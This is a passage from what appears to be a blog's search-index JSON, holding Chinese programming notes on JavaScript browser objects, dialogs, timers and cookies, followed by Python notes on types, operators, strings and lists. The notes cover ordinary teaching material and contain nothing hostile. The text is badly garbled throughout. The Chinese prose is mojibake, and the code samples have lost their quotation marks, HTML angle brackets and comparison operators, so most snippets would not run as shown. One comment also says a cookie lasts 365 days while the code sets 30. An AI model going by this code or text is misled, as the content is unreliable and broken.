è®¡ï¼Œå‡å»ç•Œé¢ç‰¹æ€§ï¼Œæ¯”å¦‚çª—å£ä»»åŠ¡æ  document.write(å¯ç”¨é«˜åº¦: + screen.availHeight); Window Locationwindow.location å¯¹è±¡åœ¨ç¼–å†™æ—¶å¯ä¸ä½¿ç”¨ window è¿™ä¸ªå‰ç¼€ã€‚ ä¸€äº›ä¾‹å­ï¼š ä¸€äº›å®ä¾‹: location.hostname è¿”å› web ä¸»æœºçš„åŸŸå location.pathname è¿”å›å½“å‰é¡µé¢çš„è·¯å¾„å’Œæ–‡ä»¶å:document.write(location.pathname); location.port è¿”å› web ä¸»æœºçš„ç«¯å£ ï¼ˆ80 æˆ– 443ï¼‰ location.protocol è¿”å›æ‰€ä½¿ç”¨çš„ web åè®®ï¼ˆhttp: æˆ– https:ï¼‰ location.href å±æ€§è¿”å›å½“å‰é¡µé¢çš„ URLã€‚å®ä¾‹å¦‚ä¸‹ï¼š document.write(location.href);//è¿”å›å®Œæ•´çš„URL location.assign() æ–¹æ³•åŠ è½½æ–°çš„æ–‡æ¡£ã€‚å®ä¾‹å¦‚ä¸‹ï¼š scriptfunction newDoc() window.location.assign(https://www.runoob.com)/scriptinput type=button value=åŠ è½½æ–°æ–‡æ¡£ onclick=newDoc() Window historywindow.historyå¯¹è±¡åœ¨ç¼–å†™æ—¶å¯ä¸ä½¿ç”¨ window è¿™ä¸ªå‰ç¼€ã€‚ ä¸€äº›æ–¹æ³•ï¼š history.back() - ä¸åœ¨æµè§ˆå™¨ç‚¹å‡»åé€€æŒ‰é’®ç›¸åŒ scriptfunction goBack() window.history.back()/scriptinput type=button value=Back onclick=goBack() history.forward() - ä¸åœ¨æµè§ˆå™¨ä¸­ç‚¹å‡»å‘å‰æŒ‰é’®ç›¸åŒï¼šèµ·ä½œç”¨çš„å‰ææ˜¯ä½ å¤„äºçš„ä¸æ˜¯æœ€æ–°ç•Œé¢ Window Navigatorwindow.navigator å¯¹è±¡åŒ…å«æœ‰å…³è®¿é—®è€…æµè§ˆå™¨çš„ä¿¡æ¯ï¼Œä¸‹é¢å®ä¾‹é‡Œé¢æœ‰å‡ ä¸ªå¼ƒç”¨çš„ï¼Œå¯ä»¥æ‰¾åˆ°æ›´å¥½çš„æ›¿ä»£ div id=example/divscripttxt = pæµè§ˆå™¨ä»£å·: + navigator.appCodeName + /p;txt+= pæµè§ˆå™¨åç§°: + navigator.appName + /p;txt+= pæµè§ˆå™¨ç‰ˆæœ¬: + navigator.appVersion + /p;txt+= på¯ç”¨Cookies: + navigator.cookieEnabled + /p;txt+= pç¡¬ä»¶å¹³å°: + navigator.platform + /p;txt+= pç”¨æˆ·ä»£ç†: + navigator.userAgent + /p;txt+= pç”¨æˆ·ä»£ç†è¯­è¨€: + navigator.language + /p;document.getElementById(example).innerHTML=txt;/script å¼¹çª—å¼¹çª—ä½¿ç”¨ åæ–œæ  + â€œnâ€( ) æ¥è®¾ç½®æ¢è¡Œï¼šalert(Hello How are you?); è­¦å‘Šçª— è­¦å‘Šæ¡†ç»å¸¸ç”¨äºç¡®ä¿ç”¨æˆ·å¯ä»¥å¾—åˆ°æŸäº›ä¿¡æ¯ã€‚ alert(ä½ å¥½ï¼Œæˆ‘æ˜¯ä¸€ä¸ªè­¦å‘Šæ¡†ï¼); å½“è­¦å‘Šæ¡†å‡ºç°åï¼Œç”¨æˆ·éœ€è¦ç‚¹å‡»ç¡®å®šæŒ‰é’®æ‰èƒ½ç»§ç»­è¿›è¡Œæ“ä½œã€‚ ç¡®è®¤çª— ç¡®è®¤æ¡†é€šå¸¸ç”¨äºéªŒè¯æ˜¯å¦æ¥å—ç”¨æˆ·æ“ä½œï¼šwindow.confirm(sometext);wnidow.å¯åŠ å¯ä¸åŠ  å½“ç¡®è®¤æ¡†å¼¹å‡ºæ—¶ï¼Œç”¨æˆ·å¯ä»¥ç‚¹å‡» â€œç¡®è®¤â€ æˆ–è€… â€œå–æ¶ˆâ€ æ¥ç¡®å®šç”¨æˆ·æ“ä½œã€‚ å½“ä½ ç‚¹å‡» â€œç¡®è®¤â€, ç¡®è®¤æ¡†è¿”å› trueï¼Œ å¦‚æœç‚¹å‡» â€œå–æ¶ˆâ€, ç¡®è®¤æ¡†è¿”å› false scriptfunction myFunction()\tvar x;\tvar r=confirm(æŒ‰ä¸‹æŒ‰é’®!);\tif (r==true) x=ä½ æŒ‰ä¸‹äº†\\ç¡®å®š\\æŒ‰é’®!; else x=ä½ æŒ‰ä¸‹äº†\\å–æ¶ˆ\\æŒ‰é’®!; document.getElementById(demo).innerHTML=x;/script æç¤ºæ¡† æç¤ºæ¡†ç»å¸¸ç”¨äºæç¤ºç”¨æˆ·åœ¨è¿›å…¥é¡µé¢å‰è¾“å…¥æŸä¸ªå€¼ï¼šwindow.prompt(sometext,defaultvalue);åé¢é‚£ä¸ªç›¸å½“äºé¢„å¡«å……çš„å€¼ å½“æç¤ºæ¡†å‡ºç°åï¼Œç”¨æˆ·éœ€è¦è¾“å…¥æŸä¸ªå€¼ï¼Œç„¶åç‚¹å‡»ç¡®è®¤æˆ–å–æ¶ˆæŒ‰é’®æ‰èƒ½ç»§ç»­æ“çºµã€‚ å¦‚æœç”¨æˆ·ç‚¹å‡»ç¡®è®¤ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸ºè¾“å…¥çš„å€¼ã€‚å¦‚æœç”¨æˆ·ç‚¹å‡»å–æ¶ˆï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸º nullã€‚ scriptfunction myFunction()\tvar x;\tvar person=prompt(è¯·è¾“å…¥ä½ çš„åå­—,Harry Potter);\tif (person!=null person!=) x=ä½ å¥½ + person + ! ä»Šå¤©æ„Ÿè§‰å¦‚ä½•?; document.getElementById(demo).innerHTML=x;\t/script è®¡æ—¶äº‹ä»¶é€šè¿‡ä½¿ç”¨ JavaScriptï¼Œæˆ‘ä»¬æœ‰èƒ½åŠ›åšåˆ°åœ¨ä¸€ä¸ªè®¾å®šçš„æ—¶é—´é—´éš”ä¹‹åæ¥æ‰§è¡Œä»£ç ï¼Œè€Œä¸æ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨åç«‹å³æ‰§è¡Œã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºè®¡æ—¶äº‹ä»¶ã€‚ setInterval() æ–¹æ³• setInterval() é—´éš”æŒ‡å®šçš„æ¯«ç§’æ•°ä¸åœåœ°æ‰§è¡ŒæŒ‡å®šçš„ä»£ç ï¼šsetInterval(javascript function,milliseconds); setInterval() ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°ï¼ˆfunctionï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°é—´éš”çš„æ¯«ç§’æ•° //3ç§’å¼¹å‡ºä¸€ä¸ªhelloè­¦å‘Šçª—function myFunction()\tsetInterval(function()alert(Hello),3000);//æ˜¾ç¤ºæ—¶é’Ÿï¼Œå¹¶åœæ­¢p id=demo/pbutton onclick=myStopFunction()åœæ­¢/buttonscriptvar myVar=setInterval(function()myTimer(),1000);function myTimer()\tvar d=new Date();\tvar t=d.toLocaleTimeString();\tdocument.getElementById(demo).innerHTML=t;function myStopFunction()\tclearInterval(myVar);/script clearInterval() æ–¹æ³•ç”¨äºåœæ­¢ setInterval() æ–¹æ³•æ‰§è¡Œçš„å‡½æ•°ä»£ç ï¼šclearInterval(intervalVariable) è¦ä½¿ç”¨ clearInterval() æ–¹æ³•, åœ¨åˆ›å»ºè®¡æ—¶æ–¹æ³•æ—¶ä½ å¿…é¡»ä½¿ç”¨å…¨å±€å˜é‡myVar=setInterval(javascriptfunction,milliseconds); ç„¶åä½ å¯ä»¥ä½¿ç”¨ clearInterval() æ–¹æ³•æ¥åœæ­¢æ‰§è¡Œï¼šclearInterval(myVar); setTimeout()æ–¹æ³• å…·ä½“çŸ¥è¯†åœ¨ä¸Šé¢çš„â€œå¼‚æ­¥ç¼–ç¨‹â€ä¸€èŠ‚ä¸­ bodyscriptfunction timedText()\tvar x=document.getElementById(txt);\tvar t1=setTimeout(function()x.value=2 ç§’,2000);\tvar t2=setTimeout(function()x.value=4 ç§’,4000);\tvar t3=setTimeout(function()x.value=6 ç§’,6000);/scriptforminput type=button value=æ˜¾ç¤ºæ–‡æœ¬æ—¶é—´! onclick=timedText() /input type=text id=txt //formpç‚¹å‡»ä¸Šé¢çš„æŒ‰é’®ï¼Œè¾“å‡ºçš„æ–‡æœ¬å°†å‘Šè¯‰ä½ 2ç§’ï¼Œ4ç§’ï¼Œ6ç§’å·²ç»è¿‡å»äº†ã€‚/p/body clearTimeout() æ–¹æ³•ç”¨äºåœæ­¢æ‰§è¡ŒsetTimeout()æ–¹æ³•çš„å‡½æ•°ä»£ç  è¦ä½¿ç”¨clearTimeout() æ–¹æ³•, ä½ å¿…é¡»åœ¨åˆ›å»ºè¶…æ—¶æ–¹æ³•ä¸­ï¼ˆsetTimeoutï¼‰ä½¿ç”¨å…¨å±€å˜é‡: CookieJavaScript å¯ä»¥ä½¿ç”¨ document.cookie å±æ€§æ¥åˆ›å»º ã€è¯»å–ã€åŠåˆ é™¤ cookieã€‚ åˆ›å»ºcookie JavaScript ä¸­ï¼Œåˆ›å»º cookie å¦‚ä¸‹æ‰€ç¤ºï¼š document.cookie=username=John Doe; æ‚¨è¿˜å¯ä»¥ä¸º cookie æ·»åŠ ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼ˆä»¥ UTC æˆ– GMT æ—¶é—´ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œcookie åœ¨æµè§ˆå™¨å…³é—­æ—¶åˆ é™¤ï¼š document.cookie=username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; æ‚¨å¯ä»¥ä½¿ç”¨ path å‚æ•°å‘Šè¯‰æµè§ˆå™¨ cookie çš„è·¯å¾„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œcookie å±äºå½“å‰é¡µé¢ã€‚ document.cookie=username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/; è¯»å–cookie æ ¼å¼ï¼švar x = document.cookie; document.cookie å°†ä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›æ‰€æœ‰çš„ cookieï¼Œç±»å‹æ ¼å¼ï¼š cookie1value; cookie2value; cookie3value; ä¿®æ”¹cookie åœ¨ JavaScript ä¸­ï¼Œä¿®æ”¹ cookie ç±»ä¼¼äºåˆ›å»º cookieï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š document.cookie=username=John Smith; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/; æ—§çš„ cookie å°†è¢«è¦†ç›–ã€‚ åˆ é™¤cookie åˆ é™¤ cookie éå¸¸ç®€å•ã€‚æ‚¨åªéœ€è¦è®¾ç½® expires å‚æ•°ä¸ºä»¥å‰çš„æ—¶é—´å³å¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè®¾ç½®ä¸º Thu, 01 Jan 1970 00:00:00 GMT: document.cookie = username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; æ³¨æ„ï¼Œå½“æ‚¨åˆ é™¤æ—¶ä¸å¿…æŒ‡å®š cookie çš„å€¼ã€‚ ä¸€ä¸ªå…³äºcookieçš„å®Œæ•´å®ä¾‹ !DOCTYPE htmlhtmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headheadscriptfunction setCookie(cname,cvalue,exdays)\tvar d = new Date();\td.setTime(d.getTime()+(exdays*24*60*60*1000));//æ¯«ç§’æ•°\tvar expires = expires=+d.toGMTString();\tdocument.cookie = cname+=+cvalue+; +expires;//cookie çš„åç§°ä¸º cnameï¼Œcookie çš„å€¼ä¸º cvalueï¼Œå¹¶è®¾ç½®äº† cookie çš„è¿‡æœŸæ—¶é—´ expiresfunction getCookie(cname)//cookie åçš„å‚æ•°ä¸º cname\tvar name = cname + =;//åˆ›å»ºä¸€ä¸ªæ–‡æœ¬å˜é‡ç”¨äºæ£€ç´¢æŒ‡å®š cookie var ca = document.cookie.split(;);//ä½¿ç”¨åˆ†å·æ¥åˆ†å‰² document.cookie å­—ç¬¦ä¸²ï¼Œå¹¶å°†åˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„èµ‹å€¼ç»™ ca\tfor(var i=0; ica.length; i++) var c = ca[i].trim(); if (c.indexOf(name)==0) return c.substring(name.length,c.length); //å¾ªç¯ ca æ•°ç»„ (i=0;ica.length;i++)ï¼Œç„¶åè¯»å–æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ï¼Œå¹¶å»é™¤å‰åç©ºæ ¼ (c=ca[i].trim())\treturn ;//å¦‚æœæ‰¾åˆ° cookie(c.indexOf(name) == 0)ï¼Œè¿”å› cookie çš„å€¼ï¼›æ²¡æœ‰æ‰¾åˆ° cookie, è¿”å› function checkCookie()\tvar user=getCookie(username);\tif (user!=) alert(æ¬¢è¿ + user + å†æ¬¡è®¿é—®); else user = prompt(è¯·è¾“å…¥ä½ çš„åå­—:,); if (user!= user!=null) setCookie(username,user,30); å¦‚æœè®¾ç½®äº† cookieï¼Œå°†æ˜¾ç¤ºä¸€ä¸ªé—®å€™ä¿¡æ¯ã€‚å¦‚æœæ²¡æœ‰è®¾ç½® cookieï¼Œå°†ä¼šæ˜¾ç¤ºä¸€ä¸ªå¼¹çª—ç”¨äºè¯¢é—®è®¿é—®è€…çš„åå­—ï¼Œå¹¶è°ƒç”¨ setCookie å‡½æ•°å°†è®¿é—®è€…çš„åå­—å­˜å‚¨ 365 å¤©/script/headbody onload=checkCookie()/body/html è¿™é‡Œä½¿ç”¨ substring() æ–¹æ³•è·å–ä»åç§°é•¿åº¦åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„å­å­—ç¬¦ä¸²ï¼Œå³è·å–äº†æŒ‡å®šåç§°çš„ cookie çš„å€¼ï¼Œå¹¶å°†å…¶è¿”å›ã€‚ å…¶ä»–ç½‘é¡µä¸Šæ˜¾ç¤ºä¸€ä¸ªé’Ÿè¡¨ !DOCTYPE htmlhtmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/titlescriptfunction startTime()\tvar today=new Date();\tvar h=today.getHours();\tvar m=today.getMinutes();\tvar s=today.getSeconds();// åœ¨å°äº10çš„æ•°å­—å‰åŠ ä¸€ä¸ªâ€˜0â€™\tm=checkTime(m);\ts=checkTime(s);\tdocument.getElementById(txt).innerHTML=h+:+m+:+s;\tt=setTimeout(function()startTime(),500);function checkTime(i)\tif (i10) i=0 + i; return i;/script/headbody onload=startTime()div id=txt/div/body/html ä¸æ­¢ä»¥ä¸Šè¿™ä¸€ç§æ–¹æ³•","tags":["å‰ç«¯"],"categories":["è¯­è¨€"]},{"title":"pythonç¬”è®°","path":"/2024/01/15/python_max/pythonç¬”è®°/","content":"pythonåŸºç¡€æ•°æ®ç±»å‹è½¬æ¢int() å¼ºåˆ¶è½¬æ¢ä¸ºæ•´å‹ float() å¼ºåˆ¶è½¬æ¢ä¸ºæµ®ç‚¹å‹ str() å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ x = str(s1) # x è¾“å‡ºç»“æœä¸º s1y = str(2) # y è¾“å‡ºç»“æœä¸º 2z = str(3.0) # z è¾“å‡ºç»“æœä¸º 3.0 æ•´å‹å’Œå­—ç¬¦ä¸²ç±»å‹è¿›è¡Œè¿ç®—ï¼Œå°±å¯ä»¥ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢æ¥å®Œæˆ num_int = 123num_str = 456print(num_int æ•°æ®ç±»å‹ä¸º:,type(num_int))print(ç±»å‹è½¬æ¢å‰ï¼Œnum_str æ•°æ®ç±»å‹ä¸º:,type(num_str))num_str = int(num_str) # å¼ºåˆ¶è½¬æ¢ä¸ºæ•´å‹print(ç±»å‹è½¬æ¢åï¼Œnum_str æ•°æ®ç±»å‹ä¸º:,type(num_str))num_sum = num_int + num_strprint(num_int ä¸ num_str ç›¸åŠ ç»“æœä¸º:,num_sum)print(sum æ•°æ®ç±»å‹ä¸º:,type(num_sum)) è¿ç®—ç¬¦pythonä½è¿ç®—ç¬¦ æŒ‰ä½è¿ç®—ç¬¦æ˜¯æŠŠæ•°å­—çœ‹ä½œäºŒè¿›åˆ¶æ¥è¿›è¡Œè®¡ç®—çš„ å‡è®¾a60,b13äºŒè¿›åˆ¶æ ¼å¼ä¸ºï¼ša 0011 1100ï¼›b 0000 1101 è¿ç®—ç¬¦ æè¿° å®æµ‹ æŒ‰ä½ä¸è¿ç®—ç¬¦ï¼šå‚ä¸è¿ç®—çš„ä¸¤ä¸ªå€¼,å¦‚æœä¸¤ä¸ªç›¸åº”ä½éƒ½ä¸º1,åˆ™è¯¥ä½çš„ç»“æœä¸º1,å¦åˆ™ä¸º0 (a b) è¾“å‡ºç»“æœ 12 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 0000 1100 | æŒ‰ä½æˆ–è¿ç®—ç¬¦ï¼šåªè¦å¯¹åº”çš„äºŒä¸ªäºŒè¿›ä½æœ‰ä¸€ä¸ªä¸º1æ—¶ï¼Œç»“æœä½å°±ä¸º1 (a|b)è¾“å‡ºç»“æœ 61 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 0011 1101 ^ æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦ï¼šå½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ï¼Œç»“æœä¸º1 (a ^ b) è¾“å‡ºç»“æœ 49 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 0011 0001 ~ æŒ‰ä½å–åè¿ç®—ç¬¦ï¼šå¯¹æ•°æ®çš„æ¯ä¸ªäºŒè¿›åˆ¶ä½å–å,å³æŠŠ1å˜ä¸º0,æŠŠ0å˜ä¸º1ã€‚**~x** ç±»ä¼¼äº -x-1 (~a ) è¾“å‡ºç»“æœ -61 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 1100 0011ï¼Œ åœ¨ä¸€ä¸ªæœ‰ç¬¦å·äºŒè¿›åˆ¶æ•°çš„è¡¥ç å½¢å¼ã€‚ å·¦ç§»åŠ¨è¿ç®—ç¬¦ï¼šè¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ï¼Œç”±â€â€å³è¾¹çš„æ•°æŒ‡å®šç§»åŠ¨çš„ä½æ•°ï¼Œé«˜ä½ä¸¢å¼ƒï¼Œä½ä½è¡¥0ã€‚ a 2 è¾“å‡ºç»“æœ 240 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 1111 0000 å³ç§»åŠ¨è¿ç®—ç¬¦ï¼šæŠŠâ€â€å·¦è¾¹çš„è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å³ç§»è‹¥å¹²ä½ï¼Œâ€â€å³è¾¹çš„æ•°æŒ‡å®šç§»åŠ¨çš„ä½æ•° a 2 è¾“å‡ºç»“æœ 15 ï¼ŒäºŒè¿›åˆ¶è§£é‡Šï¼š 0000 1111 é€»è¾‘è¿ç®—ç¬¦ a10,b20 è¿ç®—ç¬¦ é€»è¾‘è¡¨è¾¾å¼ æè¿° å®ä¾‹ and x and y å¸ƒå°”â€ä¸â€ - å¦‚æœ x ä¸º Falseï¼Œx and y è¿”å› x çš„å€¼ï¼Œå¦åˆ™è¿”å› y çš„è®¡ç®—å€¼ (a and b) è¿”å› 20ã€‚ or x or y å¸ƒå°”â€æˆ–â€ - å¦‚æœ x æ˜¯ Trueï¼Œå®ƒè¿”å› x çš„å€¼ï¼Œå¦åˆ™å®ƒè¿”å› y çš„è®¡ç®—å€¼ã€‚ (a or b) è¿”å› 10ã€‚ not not x å¸ƒå°”â€éâ€ - å¦‚æœ x ä¸º Trueï¼Œè¿”å› False ã€‚å¦‚æœ x ä¸º Falseï¼Œå®ƒè¿”å› Trueã€‚ not(a and b) è¿”å› False æˆå‘˜è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° å®ä¾‹ in å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› False x åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x åœ¨ y åºåˆ—ä¸­è¿”å› True not in å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ²¡æœ‰æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› False x ä¸åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x ä¸åœ¨ y åºåˆ—ä¸­è¿”å› True a = 10b = 20list = [1, 2, 3, 4, 5 ]if ( a in list ): print (1 - å˜é‡ a åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­)else: print (1 - å˜é‡ a ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­)if ( b not in list ): print (2 - å˜é‡ b ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­)else: print (2 - å˜é‡ b åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­) èº«ä»½è¿ç®—ç¬¦ èº«ä»½è¿ç®—ç¬¦ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å­˜å‚¨å•å…ƒ(å°±æ˜¯åœ°å€) è¿ç®—ç¬¦ æè¿° å®ä¾‹ is is æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸€ä¸ªå¯¹è±¡ x is y, ç±»ä¼¼ id(x) id(y) , å¦‚æœå¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False is not is not æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸åŒå¯¹è±¡ x is not y ï¼Œ ç±»ä¼¼ **id(x) ! id(y)**ã€‚å¦‚æœå¼•ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å›ç»“æœ Trueï¼Œå¦åˆ™è¿”å› False id()å‡½æ•°ç”¨äºè·å–å¯¹è±¡å†…å­˜åœ°å€ æ•°å­—æ•°å­¦å‡½æ•° ç›¸å…³å‡½æ•° éšæœºæ•°å‡½æ•° ç›¸å…³å‡½æ•° ä¸‰è§’å‡½æ•° ç›¸å…³å‡½æ•° æ•°å­¦å¸¸é‡ å¸¸é‡ æè¿° pi æ•°å­¦å¸¸é‡ piï¼ˆåœ†å‘¨ç‡ï¼Œä¸€èˆ¬ä»¥Ï€æ¥è¡¨ç¤ºï¼‰ e æ•°å­¦å¸¸é‡ eï¼Œeå³è‡ªç„¶å¸¸æ•°ï¼ˆè‡ªç„¶å¸¸æ•°ï¼‰ å­—ç¬¦ä¸²pythonä¸­è®¿é—®å­å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨æ–¹æ‹¬å· []æ¥æˆªå–å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºï¼šå˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]ï¼›ç´¢å¼•å€¼ç´¢å¼•å€¼ä»¥ 0 ä¸ºå¼€å§‹å€¼ï¼Œ**-1** ä¸ºä»æœ«å°¾çš„å¼€å§‹ä½ç½® ï¼ˆæ³¨æ„ï¼šæˆªå–çš„å­—ç¬¦ä¸²å†…å®¹ä¸åŒ…æ‹¬å°¾ä¸‹æ ‡ï¼›åˆ‡ç‰‡çš„è§„åˆ™æ˜¯å§‹ç»ˆä»å·¦åˆ°å³è¿›è¡Œï¼‰ var1 = Hello World!var2 = Runoob print (var1[0]: , var1[0])print (var2[1:5]: , var2[1:5])æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼švar1[0]: Hvar2[1:5]: unoo ä¹Ÿå¯ä»¥æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†å¹¶ä¸å…¶ä»–å­—æ®µæ‹¼æ¥ var1 = Hello World!print (å·²æ›´æ–°å­—ç¬¦ä¸² : , var1[:6] + Runoob!) è½¬ä¹‰å­—ç¬¦ ç›¸å…³å­—ç¬¦è¡¨æ ¼ ä¸‰å¼•å· pythonä¸‰å¼•å·å…è®¸ä¸€ä¸ªå­—ç¬¦ä¸²è·¨å¤šè¡Œï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«æ¢è¡Œç¬¦ã€åˆ¶è¡¨ç¬¦ä»¥åŠå…¶ä»–ç‰¹æ®Šå­—ç¬¦ para_str = è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²çš„å®ä¾‹å¤šè¡Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨åˆ¶è¡¨ç¬¦TAB ( \\t )ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ [ ]ã€‚print (para_str) å­—ç¬¦ä¸²å†…å»ºå‡½æ•° å¥½å¤šï¼Œå…·ä½“è§ä¸‹é¢é“¾æ¥ é“¾æ¥ f-string f-string æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»¥ f å¼€å¤´ï¼Œåé¢è·Ÿç€å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸­çš„è¡¨è¾¾å¼ç”¨å¤§æ‹¬å· {} åŒ…èµ·æ¥ï¼Œå®ƒä¼šå°†å˜é‡æˆ–è¡¨è¾¾å¼è®¡ç®—åçš„å€¼æ›¿æ¢è¿›å» name = Runoob fHello name # æ›¿æ¢å˜é‡Hello Runoob f1+2 # ä½¿ç”¨è¡¨è¾¾å¼3 w = name: Runoob, url: www.runoob.com fw[name]: w[url]Runoob: www.runoob.com è¿™ç§æ–¹æ³•æ›´ç®€å•ï¼Œä¸ç”¨åˆ¤æ–­ç”¨%sè¿˜æ˜¯ï¼Œ%dã€‚ åˆ—è¡¨å¯ä»¥ä½¿ç”¨ append() æ–¹æ³•æ¥æ·»åŠ åˆ—è¡¨é¡¹ list1 = [Google, Runoob, Taobao]list1.append(Baidu)print (æ›´æ–°åçš„åˆ—è¡¨ : , list1) å¯ä»¥ä½¿ç”¨ del è¯­å¥æ¥åˆ é™¤åˆ—è¡¨ä¸­çš„å…ƒç´  list = [Google, Runoob, 1997, 2000] print (åŸå§‹åˆ—è¡¨ : , list)del list[2]print (åˆ é™¤ç¬¬ä¸‰ä¸ªå…ƒç´  : , list) åˆ—è¡¨è„šæœ¬æ“ä½œç¬¦ åˆ—è¡¨å¯¹ + å’Œ * çš„æ“ä½œç¬¦ä¸å­—ç¬¦ä¸²ç›¸ä¼¼ã€‚+ å·ç”¨äºç»„åˆåˆ—è¡¨ï¼Œ* å·ç”¨äºé‡å¤åˆ—è¡¨ Python è¡¨è¾¾å¼ ç»“æœ æè¿° len([1, 2, 3]) 3 é•¿åº¦ [1, 2, 3] + [4, 5, 6] [1, 2, 3, 4, 5, 6] ç»„åˆ [â€˜Hi!â€™] * 4 [â€˜Hi!â€™, â€˜Hi!â€™, â€˜Hi!â€™, â€˜Hi!â€™] é‡å¤ 3 in [1, 2, 3] True å…ƒç´ æ˜¯å¦å­˜åœ¨äºåˆ—è¡¨ä¸­ for x in [1, 2, 3]: print(x, endâ€ â€œ) 1 2 3 è¿­ä»£ åµŒå¥—åˆ—è¡¨ åœ¨åˆ—è¡¨é‡Œé¢åˆ›å»ºå…¶å®ƒåˆ—è¡¨ a = [a, b, c] n = [1, 2, 3] x = [a, n] x[[a, b, c], [1, 2, 3]] x[0][a, b, c] x[0][1]b åˆ—è¡¨å‡½æ•°æ–¹æ³• æ–¹æ³• æè¿° list.append(x) æŠŠä¸€ä¸ªå…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨çš„ç»“å°¾ï¼Œç›¸å½“äº a[len(a):] [x]ã€‚ list.extend(L) é€šè¿‡æ·»åŠ æŒ‡å®šåˆ—è¡¨çš„æ‰€æœ‰å…ƒç´ æ¥æ‰©å……åˆ—è¡¨ï¼Œç›¸å½“äº a[len(a):] Lã€‚ list.insert(i, x) åœ¨æŒ‡å®šä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡†å¤‡æ’å…¥åˆ°å…¶å‰é¢çš„é‚£ä¸ªå…ƒç´ çš„ç´¢å¼•ï¼Œä¾‹å¦‚ a.insert(0, x) ä¼šæ’å…¥åˆ°æ•´ä¸ªåˆ—è¡¨ä¹‹å‰ï¼Œè€Œ a.insert(len(a), x) ç›¸å½“äº a.append(x) ã€‚ list.remove(x) åˆ é™¤åˆ—è¡¨ä¸­å€¼ä¸º x çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ²¡æœ‰è¿™æ ·çš„å…ƒç´ ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚ list.pop([i]) ä»åˆ—è¡¨çš„æŒ‡å®šä½ç½®ç§»é™¤å…ƒç´ ï¼Œå¹¶å°†å…¶è¿”å›ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šç´¢å¼•ï¼Œa.pop()è¿”å›æœ€åä¸€ä¸ªå…ƒç´ ã€‚å…ƒç´ éšå³ä»åˆ—è¡¨ä¸­è¢«ç§»é™¤ã€‚ï¼ˆæ–¹æ³•ä¸­ i 